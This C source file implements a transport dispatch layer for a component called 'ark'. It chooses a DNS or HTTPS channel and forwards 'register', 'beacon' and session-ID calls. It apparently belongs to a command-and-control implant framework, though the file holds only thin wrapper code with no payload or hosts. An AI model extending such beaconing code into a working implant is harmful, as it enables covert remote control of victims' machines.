#include <stdlib.h>
#include <string.h>

#include "ark/config.h"
#include "ark/transport.h"

int ark_transport_create(const char *type, ark_transport **out) {
    if (!type || !type[0]) type = ARK_TRANSPORT_TYPE;
    if (!type[0]) type = "https";
    if (strcmp(type, "dns") == 0)
        return ark_transport_create_dns(out);
    return ark_transport_create_https(out);
}

void ark_transport_destroy(ark_transport *t) {
    if (t && t->ops && t->ops->destroy)
        t->ops->destroy(t);
}

int ark_transport_register(ark_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    if (!t || !t->ops || !t->ops->register_call) return 0;
    return t->ops->register_call(t, req, req_len, resp, resp_len);
}

int ark_transport_beacon(ark_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    if (!t || !t->ops || !t->ops->beacon_call) return 0;
    return t->ops->beacon_call(t, req, req_len, resp, resp_len);
}

void ark_transport_set_session_id(ark_transport *t, const char *session_id) {
    if (!t || !session_id || !t->ops || !t->ops->set_session_id) return;
    t->ops->set_session_id(t, session_id);
}